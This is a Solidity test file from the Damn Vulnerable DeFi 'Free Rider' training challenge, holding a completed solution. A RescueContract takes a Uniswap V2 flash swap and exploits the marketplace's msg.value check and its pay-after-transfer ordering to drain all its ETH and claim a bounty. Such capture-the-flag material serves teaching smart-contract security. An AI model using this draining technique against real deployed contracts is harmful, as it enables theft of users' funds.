// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
        uniswapV2Router = IUniswapV2Router02(
            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        // 1. Deploy FreeRiderNFTMarketplace market
        // 2. Sends 90 ETH to the contract
        // 3. Mints 6 NFTs and set deployer as owner
        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true); // Approve marketplace to access all of deployer's NFTs

        // Open offers in the marketplace
        // Offers all 6 NFTs at 15 ETH each
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        // 1. Deployer deploys FreeRiderRecoveryManager
        // 2. Offers a bounty of 45 ETH
        // 3. Sets player as benificiary
        // 4. The contracts approves recoveryManagerOwner to access all of its NFTs
        recoveryManager =
            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner));
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_freeRider() public checkSolvedByPlayer {
        // 1. The initial understanding from reading the topic would be we need flashloan to accomplish the save,
        // and that is the reason why UniswapV2's router, factory and token pair was created.
        // 2. Upon inspecting the contracts, we notice that to buy all NFTs, you would need 15 ETH x 6 = 90 ETH, however
        // the bounty only provides 45 ETH as bounty.
        // 3. Further inspection tells us that the marketplace contract itself has an initial balance of 90 ETH, which is
        // something that we can exploit on.
        // 4. Since buyMany() will invoke buyOne(), and buyOne() only checks the msg.value against the price of a single
        // NFT, this is something we can trick the contract to do.
        // 5. Upon further inspecting the code, safeTransferFrom() happens before the ETH was paid to the NFT lister,
        // which means the RescueContract is the new owner and actually receives the 15ETH that we are paying!
        // 6. After receiving the 6 NFTs, we can relist 2 of them at 15 ETH each, but only send 15 ETH in msg.value to
        // further drain the remaining 15 ETH in the contract.

        // *******************
        // Plan
        // 1. Create a RescueContract
        // 1. RescueContract call 15 ETH flash loan from IUniswapV2 Pair
        // 2. RescueContract call buyMany() with msg.value 15 ETH
        // 3. RescueContract receives 6 NFTs, MarketPlace received 15 ETH and lost 90 ETH = nett loss 75 ETH,
        // 4. RescueContract sends 6 NFTs to RecoveryManager with safeTransferFrom()
        // 5. RescueContract receives bounty worth 45 ETH
        // 6. RescueContract repay 15 ETH flash loan + fee 0.3%
        // 7. Sends all ETH to player
        // *******************
        RescueContract rescueContract = new RescueContract(
            payable(weth), address(uniswapPair), payable(marketplace), address(nft), address(recoveryManager)
        );
        rescueContract.flashRescue();

        console.log("Balance of market place:", address(marketplace).balance);
        require(address(marketplace).balance == 0, "FreeRiderSolution: Optimize code to drain all of the funds in marketplace");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

contract RescueContract is IUniswapV2Callee {
    address owner;
    WETH public weth;
    IUniswapV2Pair public pair;
    FreeRiderNFTMarketplace public marketPlace;
    DamnValuableNFT public nft;
    FreeRiderRecoveryManager public recoveryManager;

    constructor(
        address payable _weth,
        address _pair,
        address payable _marketPlace,
        address _nft,
        address _recoveryManager
    ) {
        owner = msg.sender;
        pair = IUniswapV2Pair(_pair);
        weth = WETH(_weth);
        marketPlace = FreeRiderNFTMarketplace(_marketPlace);
        nft = DamnValuableNFT(_nft);
        recoveryManager = FreeRiderRecoveryManager(_recoveryManager);
    }

    // Rescue Function
    function flashRescue() external {
        require(msg.sender == owner, "RescueContract: Only owner can call flashRescue()");
        if (pair.token0() == address(weth)) {
            pair.swap(15 ether, 0, address(this), abi.encodePacked("Flash Rescue"));
        } else {
            pair.swap(0, 15 ether, address(this), abi.encodePacked("Flash Rescue"));
        }
    }

    // Flash Loan Execution
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // *******************
        // Plan
        // 1. Create a RescueContract
        // 1. RescueContract call 15 ETH flash loan from IUniswapV2 Pair
        // 2. RescueContract call buyMany() with msg.value 15 ETH
        // 3. RescueContract receives 6 NFTs, MarketPlace received 15 ETH and lost 90 ETH = nett loss 75 ETH,
        // 4. RescueContract sends 6 NFTs to RecoveryManager with safeTransferFrom()
        // 5. RescueContract receives bounty worth 45 ETH
        // 6. RescueContract repay 15 ETH flash loan + fee 0.3%
        // 7. Sends all ETH to player
        // *******************

        // take flash loan
        uint256 flashLoanAmount = 15 ether;
        weth.withdraw(flashLoanAmount);

        // call buyMany()
        // function buyMany(uint256[] calldata tokenIds) external payable nonReentrant;
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketPlace.buyMany{value: 15 ether}(tokenIds);

        // Further drain the remaing 15 ETH
        nft.setApprovalForAll(address(marketPlace), true);
        uint256[] memory listingIds = new uint256[](2);
        uint256[] memory prices = new uint256[](2);
        for (uint256 i = 0; i < 2; i++) {
            listingIds[i] = i;
            prices[i] = 15 ether;
        }
        marketPlace.offerMany(listingIds, prices);
        marketPlace.buyMany{value: 15 ether}(listingIds);

        // transfer to recovery manager
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(owner));
        }
        // Repay flash loan
        uint256 fee = (flashLoanAmount * 3) / 997 + 1; // +1 to round up
        uint256 repayAmount = flashLoanAmount + fee;
        weth.deposit{value: repayAmount}();
        weth.transfer(address(pair), repayAmount);

        // Transfer ETH to player
        payable(owner).transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
